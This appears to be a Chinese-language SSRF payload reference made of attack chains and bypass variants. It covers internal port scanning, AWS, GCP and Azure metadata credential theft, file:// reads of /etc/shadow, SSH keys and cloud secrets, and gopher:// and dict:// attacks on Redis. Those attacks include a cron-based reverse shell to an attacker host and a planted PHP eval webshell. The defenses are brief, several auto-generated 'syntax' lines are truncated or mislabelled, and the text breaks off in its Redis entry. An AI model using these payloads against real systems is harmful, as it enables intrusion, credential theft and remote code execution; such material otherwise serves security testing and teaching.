# SSRF服务端请求伪造

_12 条 web payload_

### 基础SSRF攻击  `ssrf-basic`
_服务端请求伪造基础攻击技术_
子类：**基础攻击** · tags: `ssrf` `server-side` `request`

**前置条件：**
- 存在URL输入点
- 服务器会请求用户提供的URL

**攻击链：**

**1. 探测SSRF**
> 探测SSRF漏洞
```
输入URL: http://127.0.0.1
输入URL: http://localhost
输入URL: http://[::1]
观察服务器响应是否包含内网信息
```
**语法解析：**
- `127.0.0.1` — 本地回环地址 _domain_
- `localhost` — 本地主机名 _domain_
- `[::1]` — IPv6本地地址 _value_

**2. 扫描内网端口**
> 扫描内网端口
```
http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
http://192.168.1.1:3306
根据响应差异判断端口开放状态
```
**语法解析：**
- `http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
http://192` — 攻击载荷 _value_

**3. 访问内网服务**
> 访问内网服务
```
http://192.168.1.100/admin
http://10.0.0.1:8080/manager
http://172.16.0.1:9200/_cat/indices
访问内网管理界面或敏感服务
```
**语法解析：**
- `http://192.168.1.100/admin
http://10.0.0.1:8080/manager
http://172.16.0.1:9200` — 攻击载荷 _value_

**4. 读取本地文件**
> 读取本地文件
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
使用file协议读取本地文件
```
**语法解析：**
- `file://` — 本地文件协议 _value_
- `/etc/passwd` — Linux用户信息文件 _path_

**WAF/EDR 绕过变体：**

**IP格式绕过**
> 使用不同IP格式绕过
```
http://0177.0.0.1 (八进制)
http://2130706433 (十进制)
http://0x7f000001 (十六进制)
http://127.1 (简写)
http://127.0.0.1.nip.io (DNS重绑定)
```
**语法解析：**
- `0177` — 127的八进制表示 _value_
- `2130706433` — 127.0.0.1的十进制表示 _value_

**URL解析差异**
> 利用URL解析差异
```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
利用URL解析差异绕过
```
**语法解析：**
- `127.0.0.1` — 本地回环 _domain_

**DNS重绑定**
> DNS重绑定攻击
```
使用DNS重绑定服务:
http://7f000001.cip.cc (解析为127.0.0.1)
http://127.0.0.1.nip.io
第一次解析为外网IP，第二次解析为内网IP
```
**语法解析：**
- `使用DNS重绑定服务:
http://7f000001.cip.cc` — 命令/载荷起始 _command_
- ` (解析为127.0.0.1)
http://127.0.0.1.nip.io
第一次解析为外网IP，第二次解析为内网IP` — 参数与载荷内容 _value_


**概述：** SSRF(Server-Side Request Forgery)服务端请求伪造允许攻击者通过目标服务器发起任意网络请求，可用于访问内网资源、云元数据、本地服务等外部无法直接到达的目标。

**漏洞原理：** SSRF漏洞存在于服务器根据用户提供的URL发起请求的场景：图片加载/预览、URL导入、Webhook回调、PDF生成器、文件下载代理等。攻击者可操纵URL指向内网地址(127.0.0.1/10.x/172.16.x)或云元数据端点。

**利用方法：** 完整利用流程：
1. 探测SSRF漏洞存在
2. 扫描内网端口和服务
3. 访问内部管理界面
4. 读取敏感文件或攻击内网服务

**防御措施：** 防御措施：
1. 白名单验证URL
2. 禁用不必要的协议
3. 验证解析后的IP地址
4. 网络隔离和访问控制

---

### AWS元数据攻击  `ssrf-cloud-aws`
_利用SSRF访问AWS EC2元数据服务_
子类：**云元数据** · tags: `ssrf` `aws` `metadata` `cloud`

**前置条件：**
- 存在SSRF漏洞
- 目标运行在AWS EC2上

**攻击链：**

**1. 访问元数据服务**
> 访问AWS元数据服务
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/
```
**语法解析：**
- `169.254.169.254` — AWS元数据服务地址 _value_
- `latest` — 最新版本的API _value_
- `meta-data` — 实例元数据 _value_

**2. 获取IAM凭证**
> 获取IAM临时凭证
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
获取角色名后:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```
**语法解析：**
- `iam/security-credentials` — IAM安全凭证路径 _value_

**3. 获取用户数据**
> 获取实例用户数据
```
http://169.254.169.254/latest/user-data/
可能包含敏感信息、API密钥、启动脚本
```
**语法解析：**
- `http://169.254.169.254/latest/user-data/` — 第1步操作 _command_
- `可能包含敏感信息、API密钥、启动脚本` — 第2步操作 _value_

**4. 使用IMDSv2绕过**
> 绕过IMDSv2保护
```
如果IMDSv2被强制:
1. 先获取token:
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. 使用token访问:
Header: X-aws-ec2-metadata-token: TOKEN
```
**语法解析：**
- `X-aws-ec2-metadata-token` — IMDSv2认证token _value_

**WAF/EDR 绕过变体：**

**IP编码变体绕过**
> 通过十进制、十六进制、八进制及IPv6映射等IP地址编码方式绕过169.254.169.254黑名单检测
```
# 十进制整数:
http://2852039166/latest/meta-data/
# 十六进制:
http://0xA9FEA9FE/latest/meta-data/
# 八进制:
http://0251.0376.0251.0376/latest/meta-data/
# IPv6映射:
http://[::ffff:169.254.169.254]/latest/meta-data/
# 混合编码:
http://0xA9.0376.169.0xFE/latest/meta-data/
```
**语法解析：**
- `# 十进制整数:` — 主要命令 _command_
- `...` — 共10行 _value_

**DNS重绑定与重定向链绕过**
> 利用DNS重绑定使域名在验证时解析为安全IP而实际请求时解析为元数据地址，或通过HTTP重定向链和非标准协议绕过
```
# DNS重绑定(使用rebind服务):
http://7f000001.A9FEA9FE.rbndr.us/latest/meta-data/
# 第一次解析到允许的IP，第二次解析到169.254.169.254

# 重定向链:
# 在attacker.com设置302跳转到http://169.254.169.254
http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/

# URL schema变体:
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254%0A%0A
```
**语法解析：**
- `# DNS重绑定(使用rebind服务):` — 主要命令 _command_
- `...` — 共8行 _value_


**概述：** AWS环境中的SSRF攻击可通过元数据服务(169.254.169.254)获取IAM临时凭证、实例配置等敏感信息，是云环境中最高危的SSRF利用场景之一，曾导致Capital One等重大数据泄露事件。

**漏洞原理：** AWS EC2实例的元数据服务默认在169.254.169.254上开放(IMDSv1无需特殊认证)，通过SSRF可获取IAM角色的临时AccessKey/SecretKey/Token，进而访问S3存储桶、RDS数据库、Lambda函数等AWS服务上的敏感数据。

**利用方法：** 完整利用流程：
1. 通过SSRF访问元数据服务
2. 获取IAM角色凭证
3. 使用凭证访问AWS资源
4. 获取用户数据中的敏感信息

**防御措施：** 防御措施：
1. 使用IMDSv2并强制token认证
2. 限制IAM角色权限
3. 不要在用户数据中存储敏感信息
4. 使用SSRF防护

---

### GCP元数据攻击  `ssrf-cloud-gcp`
_利用SSRF攻击Google Cloud元数据服务_
子类：**GCP元数据** · tags: `ssrf` `gcp` `cloud` `metadata`

**前置条件：**
- 存在SSRF漏洞
- 目标运行在GCP环境

**攻击链：**

**1. 访问元数据服务**
> 访问GCP元数据端点
```
http://metadata.google.internal/computeMetadata/v1/
需要添加Header:
Metadata-Flavor: Google
```
**语法解析：**
- `metadata.google.internal` — GCP元数据服务地址 _domain_
- `computeMetadata/v1/` — 计算引擎元数据API _encoding_
- `Metadata-Flavor: Google` — 必需的请求头 _header_

**2. 获取访问令牌**
> 获取服务账户令牌
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
返回OAuth访问令牌
```
**语法解析：**
- `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def` — 攻击载荷 _value_

**3. 获取服务账户信息**
> 获取服务账户邮箱和别名
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases
```
**语法解析：**
- `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def` — 攻击载荷 _value_

**4. 获取项目信息**
> 获取项目ID
```
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
```
**语法解析：**
- `http://metadata.google.internal/computeMetadata/v1/project/project-id
http://me` — 攻击载荷 _value_

**5. 获取SSH密钥**
> 获取SSH公钥
```
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
```
**语法解析：**
- `http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
` — 攻击载荷 _value_

**6. 获取Kubelet凭据**
> 获取GKE集群信息
```
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
获取Kubernetes环境变量
```
**语法解析：**
- `http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env` — 命令/关键字 _command_

**WAF/EDR 绕过变体：**

**使用IP地址**
> 绕过域名过滤
```
http://169.254.169.254/computeMetadata/v1/
使用内网IP代替域名
```
**语法解析：**
- `http://169.254.169.254/computeMetadata/v1/
使用内网IP代替域名` — 攻击载荷 _value_


**概述：** GCP(Google Cloud Platform)环境中的SSRF可访问元数据服务(metadata.google.internal)获取服务账号的OAuth Token和项目配置信息，进而控制GCP资源(存储桶/数据库/计算实例等)。

**漏洞原理：** GCP元数据服务要求Metadata-Flavor: Google头(但某些SSRF场景可注入自定义头)。关键端点包括：/computeMetadata/v1/instance/service-accounts/default/token获取Access Token、/project/project-id获取项目信息。

**利用方法：** 完整利用流程：
1. 发现SSRF漏洞
2. 访问元数据服务
3. 获取访问令牌
4. 使用令牌访问GCP资源

**防御措施：** 防御措施：
1. 限制元数据服务访问
2. 使用GCP Instance Metadata API v2
3. 实施网络隔离
4. 监控异常元数据访问

---

### Azure元数据攻击  `ssrf-cloud-azure`
_利用SSRF攻击Azure元数据服务_
子类：**Azure元数据** · tags: `ssrf` `azure` `cloud` `metadata`

**前置条件：**
- 存在SSRF漏洞
- 目标运行在Azure环境

**攻击链：**

**1. 访问元数据服务**
> 访问Azure元数据端点
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
需要添加Header:
Metadata: true
```
**语法解析：**
- `169.254.169.254` — Azure元数据服务IP _domain_
- `/metadata/instance` — 实例元数据端点 _encoding_
- `Metadata: true` — 必需的请求头 _header_

**2. 获取访问令牌**
> 获取托管身份令牌
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
返回Azure AD访问令牌
```
**语法解析：**
- `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
返回Azure` — 命令/载荷起始 _command_
- ` AD访问令牌` — 参数与载荷内容 _value_

**3. 获取计算信息**
> 获取计算实例信息
```
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
返回VM详细信息
```
**语法解析：**
- `http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
返回VM详细信` — 攻击载荷 _value_

**4. 获取网络信息**
> 获取网络配置
```
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
返回网络配置信息
```
**语法解析：**
- `http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
返回网络配置信` — 攻击载荷 _value_

**5. 获取用户数据**
> 获取用户数据
```
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text
返回用户自定义数据
```
**语法解析：**
- `http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01` — 攻击载荷 _value_

**WAF/EDR 绕过变体：**

**绕过Metadata头检查**
> 绕过请求头验证
```
使用HTTP请求走私或重定向绕过Metadata头检查
```
**语法解析：**
- `使用HTTP请求走私或重定向绕过Metadata头检查` — 攻击载荷 _value_


**概述：** Azure云环境中的SSRF可访问IMDS(Instance Metadata Service, 169.254.169.254)获取管理身份的OAuth Token，进而访问Azure Key Vault密钥、存储账户、SQL数据库等云资源。

**漏洞原理：** Azure IMDS端点需要Metadata: true头。关键路径：/metadata/instance获取VM配置、/metadata/identity/oauth2/token获取Managed Identity的Access Token。该Token可用于调用Azure Resource Manager API管理所有授权资源。

**利用方法：** 完整利用流程：
1. 发现SSRF漏洞
2. 添加Metadata头访问元数据
3. 获取托管身份令牌
4. 使用令牌访问Azure资源

**防御措施：** 防御措施：
1. 禁用托管身份（如不需要）
2. 实施网络隔离
3. 监控异常元数据访问
4. 使用Azure防火墙规则

---

### SSRF协议利用  `ssrf-protocol`
_利用各种协议进行SSRF攻击_
子类：**协议利用** · tags: `ssrf` `protocol` `file` `gopher`

**前置条件：**
- 存在SSRF漏洞
- 服务器支持多种协议

**攻击链：**

**1. File协议**
> 使用File协议读取文件
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
读取本地文件
```
**语法解析：**
- `file://` — 本地文件协议 _value_
- `/etc/passwd` — Linux用户信息文件 _path_
- `/proc/self/environ` — 当前进程环境变量 _path_

**2. Dict协议**
> 使用Dict协议探测服务
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
探测内网服务
```
**语法解析：**
- `dict://` — 字典服务协议 _value_
- `6379` — Redis默认端口 _value_
- `11211` — Memcached默认端口 _value_

**3. Gopher协议**
> 使用Gopher协议攻击内网服务
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
构造Redis命令
```
**语法解析：**
- `gopher://` — Gopher协议 _value_
- `_` — 协议分隔符 _value_
- `%0d%0a` — CRLF换行符URL编码 _encoding_

**4. LDAP协议**
> 使用LDAP协议
```
ldap://attacker.com/cn=test
ldap://127.0.0.1:389/cn=test
触发LDAP查询
```
**语法解析：**
- `ldap://attacker.com/cn=test
ldap://127.0.0.1:389/cn=test
触发LDAP查询` — 攻击载荷 _value_

**5. TFTP协议**
> 使用TFTP协议
```
tftp://attacker.com/file
触发TFTP请求
```
**语法解析：**
- `tftp://attacker.com/file
触发TFTP请求` — 攻击载荷 _value_

**WAF/EDR 绕过变体：**

**协议大小写绕过**
> 大小写混合绕过
```
FILE:///etc/passwd
File:///etc/passwd
Gopher://127.0.0.1:6379/
```
**语法解析：**
- `FILE:///etc/passwd
File:///etc/passwd
Gopher://127.0.0.1:6379/` — 攻击载荷 _value_


**概述：** SSRF协议利用扩展了攻击面，除常见的http/https外，file://读取本地文件、gopher://构造任意TCP报文、dict://探测服务、ftp://访问FTP服务等协议极大增强了SSRF的利用能力。

**漏洞原理：** SSRF支持的危险协议：file://读取本地文件(file:///etc/passwd)、gopher://构造任意TCP数据包(可攻击Redis/MySQL/SMTP等内网服务)、dict://探测端口和服务指纹、ftp://访问内网FTP、ldap://查询目录服务。

**利用方法：** 完整利用流程：
1. 测试支持的协议
2. 选择合适的协议
3. 构造攻击payload
4. 获取数据或执行命令

**防御措施：** 防御措施：
1. 白名单限制协议（仅HTTP/HTTPS）
2. 禁用危险协议处理
3. URL规范化验证
4. 网络隔离

---

### Gopher协议攻击  `ssrf-gopher`
_利用Gopher协议攻击内网服务_
子类：**Gopher攻击** · tags: `ssrf` `gopher` `redis` `mysql`

**前置条件：**
- 存在SSRF漏洞
- 服务器支持Gopher协议

**攻击链：**

**1. Gopher基础格式**
> Gopher协议格式
```
gopher://<host>:<port>/_<payload>
_后面是实际发送的数据
需要URL编码
```
**语法解析：**
- `gopher://` — Gopher协议标识 _value_
- `<host>:<port>` — 目标主机和端口 _tag_
- `_<payload>` — 要发送的数据 _value_

**2. 攻击Redis**
> 写入cron任务反弹Shell
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```
**语法解析：**
- `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a` — 攻击载荷 _value_

**3. 攻击MySQL**
> 攻击MySQL数据库
```
gopher://127.0.0.1:3306/_<MySQL协议数据包>
需要构造MySQL协议格式的数据
```
**语法解析：**
- `gopher://127.0.0.1:3306/_<MySQL协议数据包>
需要构造MySQL协议格式的数据` — 攻击载荷 _value_

**4. 攻击FastCGI**
> 攻击PHP-FPM
```
gopher://127.0.0.1:9000/_<FastCGI数据包>
构造PHP-FPM攻击载荷
```
**语法解析：**
- `gopher://127.0.0.1:9000/_<FastCGI数据包>
构造PHP-FPM攻击载荷` — 攻击载荷 _value_

**5. 发送HTTP请求**
> 发送HTTP请求
```
gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a
构造HTTP请求攻击内网
```
**语法解析：**
- `gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d` — 攻击载荷 _value_

**WAF/EDR 绕过变体：**

**双重URL编码**
> 双重URL编码绕过
```
gopher://127.0.0.1:6379/_%252a%250d%250a...
双重编码绕过
```
**语法解析：**
- `gopher://127.0.0.1:6379/_%252a%250d%250a...
双重编码绕过` — 攻击载荷 _value_


**概述：** gopher://协议是SSRF利用中最强大的协议，可构造任意TCP报文内容，能模拟Redis/MySQL/SMTP/HTTP等多种协议的通信，是SSRF攻击内网服务实现RCE的关键技术。

**漏洞原理：** gopher://通过URL编码传递原始TCP数据：gopher://ip:port/_[url-encoded-data]。可构造Redis的SLAVEOF/CONFIG SET命令写webshell、MySQL认证包执行SQL语句、SMTP邮件发送、HTTP POST请求等，将SSRF升级为内网服务的任意操作。

**利用方法：** 完整利用流程：
1. 确认Gopher协议支持
2. 构造目标服务协议数据
3. URL编码payload
4. 发送攻击请求

**防御措施：** 防御措施：
1. 禁用Gopher协议
2. 白名单限制协议
3. 网络隔离
4. 监控异常请求

---

### Dict协议攻击  `ssrf-dict`
_利用Dict协议探测和攻击内网服务_
子类：**Dict协议** · tags: `ssrf` `dict` `redis` `memcached`

**前置条件：**
- 存在SSRF漏洞
- 服务器支持Dict协议

**攻击链：**

**1. Dict协议格式**
> Dict协议基础格式
```
dict://<host>:<port>/<command>
发送命令到目标服务
```
**语法解析：**
- `dict://` — Dict协议标识 _value_
- `<host>:<port>` — 目标主机和端口 _tag_
- `<command>` — 要执行的命令 _tag_

**2. 探测Redis**
> 探测Redis服务
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys%20*
获取Redis信息
```
**语法解析：**
- `dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys%20*
获取Redis信息` — 攻击载荷 _value_

**3. 探测Memcached**
> 探测Memcached服务
```
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get%20key
获取Memcached信息
```
**语法解析：**
- `dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get%20key
获取Memcached信息` — 攻击载荷 _value_

**4. Redis写入文件**
> 写入WebShell
```
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```
**语法解析：**
- `dict://127.0.0.1:6379/set%20shell%20"<?php` — 命令/载荷起始 _command_
- ` @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save` — 参数与载荷内容 _value_

**WAF/EDR 绕过变体：**

**编码绕过**
> URL编码绕过关键字过滤
```
dict://127.0.0.1:6379/%73%65%74%20...
URL编码命令
```
**语法解析：**
- `dict://127.0.0.1:6379/%73%65%74%20...
URL编码命令` — 攻击载荷 _value_


**概述：** dict://协议可向指定IP:端口发送单行文本，常用于SSRF中的端口扫描和服务指纹识别。虽然功能有限，但在gopher://不可用时是内网探测的有效替代方案。

**漏洞原理：** dict://协议向目标发送DICT协议命令(单行文本+CRLF)。利用方式：1)端口扫描(dict://ip:port/info检测端口开放) 2)Redis命令执行(dict://ip:6379/SET key value) 3)服务指纹(根据响应判断服务类型)。

**利用方法：** 完整利用流程：
1. 确认Dict协议支持
2. 探测内网服务
3. 发送恶意命令
4. 获取数据或写入文件

**防御措施：** 防御措施：
1. 禁用Dict协议
2. 白名单限制协议
3. 内网服务认证
4. 网络隔离

---

### File协议攻击  `ssrf-file`
_利用File协议读取本地文件_
子类：**File协议** · tags: `ssrf` `file` `lfi` `read`

**前置条件：**
- 存在SSRF漏洞
- 服务器支持File协议

**攻击链：**

**1. Linux敏感文件**
> 读取Linux敏感文件
_platform: linux_
```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf
file:///proc/self/environ
file:///proc/self/cmdline
```
**语法解析：**
- `file://` — File协议标识 _value_
- `/etc/passwd` — 用户信息文件 _path_
- `/proc/self/` — 当前进程信息目录 _path_

**2. Windows敏感文件**
> 读取Windows敏感文件
_platform: windows_
```
file:///c:/windows/win.ini
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
file:///c:/inetpub/logs/logfiles/
```
**语法解析：**
- `file:///c:/windows/win.ini
file:///c:/windows/system32/config/sam
file:///c:/u` — 攻击载荷 _value_

**3. Web配置文件**
> 读取Web应用配置
```
file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///app/config/database.yml
file:///app/.env
```
**语法解析：**
- `file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///app` — 攻击载荷 _value_

**4. 云环境文件**
> 读取云环境凭据
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///home/user/.aws/credentials
```
**语法解析：**
- `file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secr` — 攻击载荷 _value_

**5. SSH密钥**
> 读取SSH私钥
```
file:///home/user/.ssh/id_rsa
file:///home/user/.ssh/authorized_keys
file:///root/.ssh/id_rsa
```
**语法解析：**
- `file:///home/user/.ssh/id_rsa
file:///home/user/.ssh/authorized_keys
file:///r` — 攻击载荷 _value_

**WAF/EDR 绕过变体：**

**大小写混合**
> 大小写混合绕过
```
FILE:///etc/passwd
File:///etc/passwd
file:///ETC/PASSWD
```
**语法解析：**
- `FILE:///etc/passwd
File:///etc/passwd
file:///ETC/PASSWD` — 攻击载荷 _value_


**概述：** file://协议是SSRF中最基础的利用方式，可直接读取服务器本地文件系统上的任意文件。虽然简单，但在获取配置文件、源代码、密钥文件等敏感信息时极为有效。

**漏洞原理：** file://协议读取本地文件：file:///etc/passwd(用户列表)、file:///etc/shadow(密码哈希,需root权限)、file:///proc/self/environ(环境变量,可能包含密钥)、file:///root/.ssh/id_rsa(SSH私钥)。Windows下可读C:\\Windows\\win.ini等。

**利用方法：** 完整利用流程：
1. 确认File协议支持
2. 探测敏感文件路径
3. 读取配置文件获取凭据
4. 利用凭据进一步渗透

**防御措施：** 防御措施：
1. 禁用File协议
2. 白名单限制协议
3. 文件权限控制
4. 敏感文件加密存储

---

### SSRF绕过技术  `ssrf-bypass`
_各种绕过SSRF过滤的技术_
子类：**绕过技术** · tags: `ssrf` `bypass` `waf` `filter`

**前置条件：**
- 存在SSRF漏洞
- 存在过滤机制

**攻击链：**

**1. IP格式绕过**
> 使用不同IP格式表示127.0.0.1
```
http://0177.0.0.1 (八进制)
http://2130706433 (十进制)
http://0x7f000001 (十六进制)
http://127.1 (简写)
http://127.0.0.1.nip.io (DNS重绑定)
http://127.0.0.1.xip.io
```
**语法解析：**
- `0177` — 127的八进制表示 _value_
- `2130706433` — 127.0.0.1的十进制整数 _value_
- `0x7f000001` — 127.0.0.1的十六进制 _encoding_

**2. URL解析差异**
> 利用URL解析差异
```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
http://attacker.com\.127.0.0.1/
```
**语法解析：**
- `#@` — 利用片段标识符差异 _value_
- `\@` — 利用反斜杠解析差异 _value_

**3. 重定向绕过**
> 利用HTTP重定向
```
http://attacker.com/redirect?url=http://127.0.0.1
使用短链接服务重定向到内网
```
**语法解析：**
- `http://attacker.com/redirect?url=http://127.0.0.1
使用短链接服务重定向到内网` — 攻击载荷 _value_

**4. DNS重绑定**
> DNS重绑定攻击
```
http://7f000001.cip.cc
http://127.0.0.1.nip.io
第一次解析为外网IP，第二次解析为内网IP
```
**语法解析：**
- `http://7f000001.cip.cc
http://127.0.0.1.nip.io
第一次解析为外网IP，第二次解析为内网IP` — 攻击载荷 _value_

**5. IPv6绕过**
> 使用IPv6地址绕过
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[0000::1]
使用IPv6本地地址
```
**语法解析：**
- `http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[0000::1]
使用IPv6本地地址` — 攻击载荷 _value_

**6. 编码绕过**
> 使用编码绕过
```
http://%31%32%37%2e%30%2e%30%2e%31 (URL编码)
http://127.0.0.1%00attacker.com (空字节)
http://127.0.0.1%0d%0aHost:attacker.com (CRLF)
```
**语法解析：**
- `http://%31%32%37%2e%30%2e%30%2e%31` — 命令/载荷起始 _command_
- ` (URL编码)
http://127.0.0.1%00attacker.com (空字节)
http://127.0.0.1%0d%0aHost:attacker.com (CRLF)` — 参数与载荷内容 _value_

**WAF/EDR 绕过变体：**

**组合绕过**
> 组合多种绕过技术
```
http://0x7f.0.0.1
http://0177.0.0.1
http://127.000.000.001
多种格式组合
```
**语法解析：**
- `http://0x7f.0.0.1
http://0177.0.0.1
http://127.000.000.001
多种格式组合` — 攻击载荷 _value_


**概述：** SSRF绕过技术针对应用层面的URL过滤措施(IP黑名单/白名单/域名限制)，通过IP编码变换、DNS重绑定、URL解析差异、重定向跳转等方式突破SSRF防护。

**漏洞原理：** SSRF过滤绕过方法：1)IP变形(0177.0.0.1/2130706433/0x7f000001) 2)IPv6(::1/::ffff:127.0.0.1) 3)DNS重绑定(域名解析切换) 4)URL解析差异(@符号/URL编码) 5)302重定向跳转 6)URL短链服务 7)进制转换 8)CNAME到内网IP。

**利用方法：** 完整利用流程：
1. 分析过滤规则
2. 测试各种绕过技术
3. 找到有效的绕过方法
4. 访问内网资源

**防御措施：** 防御措施：
1. 解析后验证IP地址
2. 禁止访问内网IP段
3. 禁用重定向跟随
4. 使用DNS解析验证

---

### DNS重绑定攻击  `ssrf-dns-rebinding`
_利用DNS重绑定绕过SSRF防护_
子类：**DNS重绑定** · tags: `ssrf` `dns` `rebinding` `bypass`

**前置条件：**
- 存在SSRF漏洞
- 存在DNS解析验证

**攻击链：**

**1. DNS重绑定原理**
> DNS重绑定原理
```
第一次DNS查询：返回外网IP（通过验证）
第二次DNS查询：返回内网IP（实际访问）
利用TTL=0或短TTL
```
**语法解析：**
- `TTL=0` — DNS记录立即过期 _value_
- `第一次查询` — 返回允许的IP _value_
- `第二次查询` — 返回内网IP _value_

**2. 使用公开服务**
> 使用DNS重绑定服务
```
http://7f000001.cip.cc (解析为127.0.0.1)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network
```
**语法解析：**
- `http://7f000001.cip.cc` — 命令/载荷起始 _command_
- ` (解析为127.0.0.1)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network` — 参数与载荷内容 _value_

**3. 自建DNS服务器**
> 自建DNS重绑定服务器
```
# 使用dnspython搭建
from dnslib import *
class RebindResolver:
    def __init__(self):
        self.count = 0
    def resolve(self, request):
        self.count += 1
        if self.count % 2 == 1:
            return "1.2.3.4"  # 外网IP
        else:
            return "127.0.0.1"  # 内网IP
```
**语法解析：**
- `# 使用dnspython搭建
from dnslib import *
class RebindResolver:
    def __init__(s` — 攻击载荷 _value_

**4. 攻击流程**
> 完整攻击流程
```
1. 注册域名指向自建DNS服务器
2. 配置DNS服务器返回两个IP
3. 使用该域名发起SSRF请求
4. 第一次验证通过，第二次访问内网
```
**语法解析：**
- `1.` — 命令/载荷起始 _command_
- ` 注册域名指向自建DNS服务器
2. 配置DNS服务器返回两个IP
3. 使用该域名发起SSRF请求
4. 第一次验证通过，第二次访问内网` — 参数与载荷内容 _value_

**WAF/EDR 绕过变体：**

**多IP响应**
> 利用多IP响应
```
DNS响应包含多个A记录
服务器可能选择不同的IP
```
**语法解析：**
- `DNS响应包含多个A记录
服务器可能选择不同的IP` — 攻击载荷 _value_


**概述：** DNS重绑定攻击通过在两次DNS查询间改变域名解析结果(先解析为合法IP通过验证，再解析为内网IP发起请求)来绕过SSRF的域名/IP校验，是最隐蔽的SSRF绕过方式之一。

**漏洞原理：** DNS重绑定利用DNS TTL极低(0-1秒)的域名：第一次解析返回公网IP通过服务端URL验证，第二次解析(实际请求时)返回127.0.0.1或内网IP。可利用在线DNS重绑定服务(如rbndr.us/lock.cmpxchg8b.com)或自建DNS服务器。

**利用方法：** 完整利用流程：
1. 搭建或使用DNS重绑定服务
2. 配置域名解析策略
3. 使用该域名发起请求
4. 绕过验证访问内网

**防御措施：** 防御措施：
1. 缓存DNS解析结果
2. 使用IP地址而非域名验证
3. 禁用DNS解析
4. 网络层隔离

---

### SSRF攻击Redis  `ssrf-redis`
_利用SSRF攻击内网Redis服务_
子类：**Redis攻击** · tags: `ssrf` `redis` `rce` `webshell`

**前置条件：**
- 存在SSRF漏洞
- 内网存在未授权Redis

**攻击链：**

**1. 探测Redis**
> 探测Redis服务
```
dict://127.0.0.1:6379/info
或使用Gopher:
gopher://127.0.0.1:6379/_INFO
